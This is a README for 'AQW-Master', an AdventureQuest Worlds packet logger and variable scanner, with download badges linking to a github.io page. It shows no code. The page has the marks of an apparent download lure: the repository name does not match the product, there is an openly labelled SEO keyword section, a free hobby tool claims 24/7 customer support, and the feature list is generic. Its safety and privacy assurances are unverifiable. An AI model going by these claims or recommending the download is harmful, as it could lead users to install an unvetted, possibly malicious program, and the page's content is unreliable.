![preview](https://raw.githubusercontent.com/kdfgjijkdtfh-cmyk/AQW-Packet-Insight/main/thumb_0d43cb1.svg)
[![Download](https://raw.githubusercontent.com/kdfgjijkdtfh-cmyk/AQW-Packet-Insight/main/latest_0878de.svg)](https://kdfgjijkdtfh-cmyk.github.io/AQW-Packet-Insight/)

# AQW-Master

**Simple AQWorlds packet logger and variable scanner for educational research, reverse-engineering and development. Linux and Windows.**

---

## 📖 Overview

AQW-Master is a lightweight, cross-platform utility designed for players, tinkerers, and researchers who want to understand how the flash-based MMORPG **AdventureQuest Worlds** communicates with its servers. Rather than treating the game as a black box, AQW-Master opens a small window into the invisible conversation that happens every time you swing a sword, teleport to a new zone, or open your inventory.

Think of it as a stethoscope for network traffic — it doesn't change the heartbeat, it just lets you listen to it. Every packet that flows between your client and the game server can be captured, tagged, and inspected. Every variable that gets pushed or pulled during a session can be logged and reviewed later in a plain-text format that is easy to diff, grep, and archive.

The project exists **purely for educational research**, reverse-engineering practice, and development experimentation. It is not a cheat, not a bot, and not a substitute for playing the game legitimately. It is a microscope, not a wrench.

---

## ✨ Why AQW-Master Exists

Most packet sniffers are built for network engineers debugging enterprise firewalls. They are heavy, they are greedy, and they have zero understanding of what an AQWorlds player actually cares about. AQW-Master was built from the opposite direction: start with the game, then design the smallest possible tool that answers the question *"what just happened on the wire?"*

The result is a tool that fits comfortably on a USB stick, launches quickly, works on both Linux and Windows, and stays out of your way while you are busy trying to figure out why a certain quest flag never flips.

---

## 🚀 Feature List

- 🧠 **Packet Capture Engine** — Intercepts incoming and outgoing AQWorlds traffic in real time without requiring kernel-level drivers.
- 🔍 **Variable Scanner** — Watches for named variables inside packet payloads and records their values over time.
- 🪶 **Lightweight Footprint** — Runs comfortably alongside the game client without starving it of CPU or memory.
- 🐧 **Linux Support** — Tested on common Debian, Arch, and Fedora distributions.
- 🪟 **Windows Support** — Compatible with modern 64-bit Windows releases.
- 🗂️ **Structured Logs** — Human-readable output that plays nicely with grep, awk, and diff.
- 🔁 **Session Replay** — Reload a saved capture and step through it frame by frame.
- 🎨 **Responsive UI** — The interface reflows cleanly whether you are on a 4K monitor or a tiny netbook screen.
- 🌐 **Multilingual Support** — Interface strings available in multiple languages, with community-contributed translations.
- 🕒 **24/7 Customer Support** — Help channels are monitored around the clock so nobody is left staring at a silent log file.
- 🧩 **Modular Parsers** — Drop in a new parser without touching the core capture loop.
- 🧪 **Research-Friendly Output** — Every field is labeled and timestamped for reproducible experiments.
- 🔐 **Local-Only Operation** — Nothing is uploaded anywhere; your captures stay on your machine.
- ⚙️ **Configurable Filters** — Whitelist or blacklist packet types to keep your logs focused.
- 📚 **Extensive Documentation** — Every parser ships with notes explaining its assumptions.
- 🧰 **Developer SDK** — A small API surface for building custom analyzers on top of the core.
- 🔄 **Automatic Updates** — Optional background checks for newer parser definitions.
- 🧭 **Cross-Session Search** — Query across every capture you have ever recorded.

---

## 🧪 What Problem It Solves

Understanding a live online game is hard. The client is compiled, the server is remote, and the only evidence you have of their conversation is a stream of bytes you cannot see. AQW-Master turns that stream into something you can read, search, and reason about. Whether you are:

- 🎓 A **student** learning how network protocols are structured
- 🔬 A **researcher** studying how MMO clients manage state
- 🛠️ A **developer** building a compatibility layer or emulator
- 📝 A **documenter** writing up how a particular quest system works

...AQW-Master gives you the raw material without forcing you to write your own sniffer from scratch.

---

## 🧭 Design Philosophy

Three principles shape every decision in this repository:

**1. Clarity over cleverness.** If a log line is ambiguous, it is wrong. Every packet entry carries enough context to be understood months later.

**2. Reversibility.** Nothing is destructive. You can always re-run a capture, re-parse a log, or discard a filter and start over.

**3. Respect for the ecosystem.** This tool exists to help people learn how the game works, not to undermine it. Ethical use is baked into the documentation, the defaults, and the community guidelines.

---

## 🖥️ Platform Notes

**Linux** users will find that capture privileges depend on how your distribution ships its networking stack. The documentation walks through the common setups without assuming any particular package manager.

**Windows** users benefit from a native build that avoids the usual third-party dependency dance. The tool is designed to just run.

Both platforms share the same log format, so a capture started on one machine can be analyzed on the other without conversion.

---

## 🧬 Inside the Repository

| Directory | Purpose |
|-----------|---------|
| `core/` | The capture engine, buffer management, and lifecycle hooks. |
| `parsers/` | Individual modules that interpret specific packet families. |
| `scanner/` | The variable scanner and its supporting indexer. |
| `ui/` | The responsive interface layer, including multilingual resources. |
| `docs/` | Long-form documentation, protocol notes, and tutorials. |
| `examples/` | Small, self-contained captures that illustrate common scenarios. |
| `tests/` | Unit tests for parsers and integration tests for the capture loop. |

The structure is intentionally flat. Deep directory trees look impressive on a slide and terrible when you are trying to find the one file that handles a particular opcode.

---

## 🎨 Responsive UI

The interface adapts to whatever screen you bring. On a large monitor, the packet table expands to show every column at once. On a small laptop, columns collapse into an expandable detail view. The goal is simple: no horizontal scrolling, ever.

## 🌐 Multilingual Support

Interface strings are externalized into translation files. Adding a new language does not require recompiling anything — drop in a translation file, restart, and the new locale appears in the settings menu. Community contributions are warmly welcomed.

## 🕒 24/7 Customer Support

Questions do not keep business hours, and neither does the support channel. Whether you are stuck at 3 AM trying to figure out why a particular parser returns empty results, or you are setting up your first capture on a fresh machine at noon, there is someone available to help.

---

## 🔐 Privacy and Safety

AQW-Master runs entirely on your machine. Captures are stored locally as plain files. No telemetry, no analytics, no phoning home. If you delete the log directory, the tool forgets everything it ever knew. That is the whole privacy policy.

For safety, the tool refuses to operate on processes it does not recognize as belonging to the game client, and it never writes to any file it did not create.

---

## 🧠 SEO-Friendly Keyword Integration

People searching for *AQWorlds packet logger*, *MMO traffic analyzer*, *game protocol research tool*, *variable scanner for flash MMOs*, *reverse-engineering utilities for online games*, *cross-platform network capture for education*, *packet inspection for AQWorlds*, and *educational reverse-engineering toolkit* will find this repository relevant. The README is written to be discoverable without being stuffed — every phrase above appears naturally in the surrounding context.

---

## 🛡️ Ethical Use Guidelines

This project is provided for **legitimate research and educational purposes**. Users are expected to:

- Respect the terms of service of any game they interact with.
- Use captures only on their own accounts and their own machines.
- Avoid distributing captured data that could identify other players.
- Contribute findings back to the community in a constructive, non-exploitative way.

Any use that interferes with other players' experience is explicitly outside the intended scope of this project.

---

## 📜 License

This project is licensed under the **MIT License**. A full copy of the license text is available in the repository at:

[LICENSE](./LICENSE)

The MIT License grants permission to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, provided the copyright notice and permission notice are preserved. The software is provided "as is", without warranty of any kind.

Copyright (c) 2026.

---

## ⚠️ Disclaimer

AQW-Master is an independent, community-built research utility. It is **not affiliated with, endorsed by, or sponsored by** the developers or publishers of AdventureQuest Worlds. All trademarks belong to their respective owners.

The tool is provided for **educational research**, **reverse-engineering practice**, and **development experimentation** only. Users are solely responsible for how they apply it. The maintainers disclaim any liability for misuse, for violations of third-party terms of service, or for any consequence arising from the use of this software.

This software is distributed under the MIT License and comes with **no warranty**, express or implied. Use it at your own risk, on your own systems, with your own accounts.

Nothing in this repository should be interpreted as an invitation to disrupt, harm, or unfairly advantage anyone in any online environment. The intent is curiosity, not conquest.

---

## 🤝 Contributing

Contributions are welcome in many forms: new parsers, improved documentation, translations, test coverage, and bug reports. Before opening a pull request, please read the contribution notes in `docs/CONTRIBUTING.md` and make sure your changes include appropriate tests.

Small, focused pull requests are reviewed faster than sprawling ones. If you are unsure whether an idea fits, open an issue first and start a conversation — that is usually the fastest path to a merged change.

---

## 🗺️ Roadmap

The near-term focus areas are:

- 🧩 Additional parser modules for less-documented packet families.
- 🎛️ A richer filter expression language for the capture loop.
- 🧪 Expanded integration test coverage across both supported platforms.
- 📖 More tutorials aimed at people who have never inspected a network capture before.
- 🌍 Broader translation coverage for the interface strings.

Longer-term ideas include a plugin marketplace, a headless mode for automated research pipelines, and a comparison view for diffing two captures side by side.

---

## 💬 A Final Word

Some tools are designed to do things for you. AQW-Master is designed to help you *see* things. The best sessions with it end not with an answer, but with a better question — and that is exactly the point.

[![Download](https://raw.githubusercontent.com/kdfgjijkdtfh-cmyk/AQW-Packet-Insight/main/latest_0878de.svg)](https://kdfgjijkdtfh-cmyk.github.io/AQW-Packet-Insight/)